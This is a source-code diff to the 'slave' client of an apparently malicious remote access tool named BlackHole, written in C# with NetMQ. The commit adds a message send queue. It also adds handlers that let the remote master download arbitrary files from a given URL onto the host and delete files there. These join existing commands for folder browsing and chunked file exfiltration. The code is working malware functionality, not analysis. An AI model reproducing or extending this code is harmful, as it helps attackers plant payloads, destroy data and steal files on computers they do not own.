@@ -2,8 +2,11 @@
 using BlackHole.Common.Network.Protocol;
 using NetMQ;
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -14,9 +17,11 @@ namespace BlackHole.Slave
     /// </summary>
     public sealed class MasterServer
     {
+        public const int SEND_INTERVAL = 10;
         private NetMQContext m_netContext;
         private NetMQSocket m_client;
         private Poller m_poller;
+        private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
 
         /// <summary>
         /// 
@@ -29,7 +34,12 @@ namespace BlackHole.Slave
             m_client.Options.ReconnectInterval = TimeSpan.FromMilliseconds(500);
             m_client.ReceiveReady += Client_ReceiveReady;
 
+            var sendTimer = new NetMQTimer(SEND_INTERVAL);
+            sendTimer.Elapsed += SendQueue;
+
             m_poller = new Poller();
+            m_poller.PollTimeout = 10;
+            m_poller.AddTimer(sendTimer);
             m_poller.AddSocket(m_client);
             m_poller.PollTillCancelledNonBlocking();
 
@@ -46,8 +56,25 @@ namespace BlackHole.Slave
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void SendQueue(object sender, NetMQTimerEventArgs e)
+        {
+            NetMQMessage message = null;
+            var i = m_sendQueue.Count;
+            while (i > 0)
+            {
+                if (m_sendQueue.TryDequeue(out message))
+                    m_client.TrySendMultipartMessage(message);
+                i--;
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
         /// <param name="message"></param>
-        private void Send(NetMessage message) => m_client.SendMultipartMessage(new NetMQMessage(new byte[][] { message.Serialize() }));
+        private void Send(NetMessage message) => m_sendQueue.Enqueue(new NetMQMessage(new byte[][] { message.Serialize() }));
 
         /// <summary>
         /// 
@@ -62,7 +89,9 @@ namespace BlackHole.Slave
                 .With<DoYourDutyMessage>(DoYourDuty)
                 .With<PingMessage>(Ping)
                 .With<NavigateToFolderMessage>(NavigateToFolder)
-                .With<DownloadFilePartMessage>(DownloadFilePart);
+                .With<DownloadFilePartMessage>(DownloadFilePart)
+                .With<UploadFileMessage>(UploadFile)
+                .With<DeleteFileMessage>(DeleteFile);
         }
 
 
@@ -121,10 +150,10 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="messageBuilder"></param>
-        private void ExecuteSimpleOperation<T>(long operationId, string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
-            => ExecuteComplexSendOperation(operationId, operationName, operation, (message) =>
+        private void ExecuteSimpleOperation<T>(string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
+            => ExecuteComplexSendOperation(-1, operationName, operation, (message) =>
             {
-                SendStatus(operationId, operationName, "Success : " + messageBuilder(message));
+                SendStatus(-1, operationName, "Success : " + messageBuilder(message));
             });
 
         /// <summary>
@@ -148,7 +177,7 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void NavigateToFolder(NavigateToFolderMessage message)
         {
-            ExecuteSimpleOperation(-1, "Folder navigation", 
+            ExecuteSimpleOperation("Folder navigation", 
                 () => FileHelper.NavigateToFolder(message.Path), 
                 (nav) => nav.Path);
         }
@@ -166,6 +195,67 @@ namespace BlackHole.Slave
                     if (part.CurrentPart == part.TotalPart)
                         SendStatus(message.Id, "File download", "Successfully downloaded : " + part.Path);
                 });
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
+        private void UploadFile(UploadFileMessage message)
+        {
+            try
+            {
+                var client = new WebClient();
+                client.DownloadProgressChanged += (s, e) =>
+                {
+                    // avoid spam by sending only 5 by 5%
+                    if (e.ProgressPercentage % 5 == 0)
+                    {
+                        Send(new UploadProgressMessage()
+                        {
+                            Id = message.Id,
+                            Path = message.Path,
+                            Percentage = e.ProgressPercentage,
+                            Uri = message.Uri
+                        });
+                    }
+                };
+                client.DownloadFileCompleted += (s, e) =>
+                {
+                    if (e.Error != null)
+                    {
+                        SendStatus(message.Id, "File upload (downloading from web)", e.Error);
+                    }
+                    else
+                    {
+                        // -1 mean finished
+                        Send(new UploadProgressMessage()
+                        {
+                            Id = message.Id,
+                            Path = message.Path,
+                            Percentage = -1,
+                            Uri = message.Uri
+                        });
+                    }
+                    client.Dispose();
+                };
+                client.DownloadFileAsync(new Uri(message.Uri), message.Path);                
+            }
+            catch(Exception e)
+            {
+                SendStatus(message.Id, "File upload (downloading from web)", e);
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="message"></param>
+        private void DeleteFile(DeleteFileMessage message)
+        {
+            ExecuteSimpleOperation("File deletion",
+                () => FileHelper.DeleteFile(message.FilePath),
+                (nav) => nav.FilePath);
         }
     }
 }
